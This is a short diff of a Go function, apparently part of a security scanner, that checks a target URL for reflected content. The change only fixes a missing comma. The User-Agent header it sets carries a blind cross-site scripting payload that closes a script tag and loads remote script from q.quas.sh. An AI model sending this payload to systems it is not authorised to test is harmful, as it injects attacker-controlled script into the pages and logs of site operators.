@@ -111,7 +111,7 @@ func checkReflected(targetURL string) ([]string, error) {
 	// temporary. Needs to be an option
 	req.Header.Add(
             "User-Agent",
-            "User-Agent: Mozilla/5.0 (X11; Linux x86_64) \"></script><script src=//q.quas.sh/></script> AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36"
+            "User-Agent: Mozilla/5.0 (X11; Linux x86_64) \"></script><script src=//q.quas.sh/></script> AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36",
         )
 
 	resp, err := httpClient.Do(req)
